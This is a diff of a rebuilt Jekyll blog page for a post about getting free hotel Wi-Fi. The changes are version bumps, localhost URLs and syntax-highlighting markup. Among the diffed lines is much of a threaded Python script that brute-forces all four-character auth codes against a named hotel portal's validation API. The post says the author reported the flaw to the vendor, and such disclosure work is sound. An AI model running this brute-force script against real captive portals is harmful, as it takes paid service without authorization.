@@ -2,22 +2,24 @@
 <html lang="en"><head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>How I Got Free Wi-Fi at a Hotel | Sahil Jain’s Blog</title>
-<meta name="generator" content="Jekyll v4.0.0" />
+<meta name="generator" content="Jekyll v4.0.1" />
 <meta property="og:title" content="How I Got Free Wi-Fi at a Hotel" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Full Disclosure: I still paid for internet and contacted Intello about the vulnerability." />
 <meta property="og:description" content="Full Disclosure: I still paid for internet and contacted Intello about the vulnerability." />
-<link rel="canonical" href="http://blog.sahiljain.ca/free-wifi/" />
-<meta property="og:url" content="http://blog.sahiljain.ca/free-wifi/" />
+<link rel="canonical" href="http://localhost:4000/free-wifi/" />
+<meta property="og:url" content="http://localhost:4000/free-wifi/" />
 <meta property="og:site_name" content="Sahil Jain’s Blog" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2016-09-10T21:05:43-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="How I Got Free Wi-Fi at a Hotel" />
 <script type="application/ld+json">
-{"description":"Full Disclosure: I still paid for internet and contacted Intello about the vulnerability.","@type":"BlogPosting","url":"http://blog.sahiljain.ca/free-wifi/","dateModified":"2016-09-10T21:05:43-07:00","datePublished":"2016-09-10T21:05:43-07:00","headline":"How I Got Free Wi-Fi at a Hotel","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.sahiljain.ca/free-wifi/"},"@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2016-09-10T21:05:43-07:00","datePublished":"2016-09-10T21:05:43-07:00","description":"Full Disclosure: I still paid for internet and contacted Intello about the vulnerability.","headline":"How I Got Free Wi-Fi at a Hotel","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/free-wifi/"},"url":"http://localhost:4000/free-wifi/"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://blog.sahiljain.ca/feed.xml" title="Sahil Jain's Blog" /></head>
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Sahil Jain&apos;s Blog" /></head>
 <body><header class="site-header" role="banner">
 
   <div class="wrapper"><a class="site-title" rel="author" href="/">Sahil Jain&#39;s Blog</a><nav class="site-nav">
@@ -104,19 +106,19 @@
 
 <span class="k">def</span> <span class="nf">doWork</span><span class="p">():</span>
   <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="n">code</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
     <span class="n">status</span><span class="p">,</span> <span class="n">url</span> <span class="o">=</span> <span class="n">getStatus</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
     <span class="n">doSomethingWithResult</span><span class="p">(</span><span class="n">status</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
-    <span class="n">q</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
+    <span class="n">q</span><span class="p">.</span><span class="n">task_done</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">getStatus</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
   <span class="k">try</span><span class="p">:</span>
-    <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s">"portal.ihotel.ca"</span><span class="p">)</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="p">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="s">"portal.ihotel.ca"</span><span class="p">)</span>
     <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"function"</span><span class="p">:</span> <span class="s">"ValidateAuthCode"</span><span class="p">,</span> <span class="s">"iHotelAuthCode"</span><span class="p">:</span> <span class="n">code</span><span class="p">,</span> <span class="s">"iHotelLocation"</span><span class="p">:</span> <span class="s">"BlueMountainGuests"</span><span class="p">}</span>
-    <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/GuestsAPI?function=ValidateAuthCode&amp;iHotelAuthCode="</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="s">"&amp;iHotelLocation=BlueMountainGuests"</span><span class="p">)</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
-    <span class="n">val</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">conn</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/GuestsAPI?function=ValidateAuthCode&amp;iHotelAuthCode="</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="s">"&amp;iHotelLocation=BlueMountainGuests"</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
     <span class="k">return</span> <span class="n">val</span><span class="p">,</span> <span class="n">code</span>
   <span class="k">except</span><span class="p">:</span>
     <span class="k">return</span> <span class="s">"error"</span><span class="p">,</span> <span class="n">code</span>
@@ -125,13 +127,13 @@
   <span class="k">print</span> <span class="n">code</span> 
   <span class="k">if</span> <span class="s">"Invalid"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
     <span class="k">print</span> <span class="n">result</span><span class="p">,</span> <span class="n">code</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="n">q</span> <span class="o">=</span> <span class="n">Queue</span><span class="p">(</span><span class="n">numThreads</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">numThreads</span><span class="p">):</span>
   <span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">doWork</span><span class="p">)</span>
-  <span class="n">t</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
-  <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+  <span class="n">t</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
 <span class="k">try</span><span class="p">:</span>
   <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="o">**</span><span class="mi">4</span><span class="p">):</span>
     <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">36</span><span class="o">**</span><span class="mi">4</span>
@@ -140,10 +142,10 @@
       <span class="n">code</span> <span class="o">=</span> <span class="n">letters</span><span class="p">[</span><span class="n">n</span><span class="o">%</span><span class="mi">36</span><span class="p">]</span> <span class="o">+</span> <span class="n">code</span>
       <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">n</span> <span class="o">/</span> <span class="mi">36</span><span class="p">)</span>
     <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-    <span class="n">q</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
-  <span class="n">q</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+    <span class="n">q</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+  <span class="n">q</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
 <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
-  <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
+  <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
 
 <div>
   <h1 id="comments">Comments</h1>
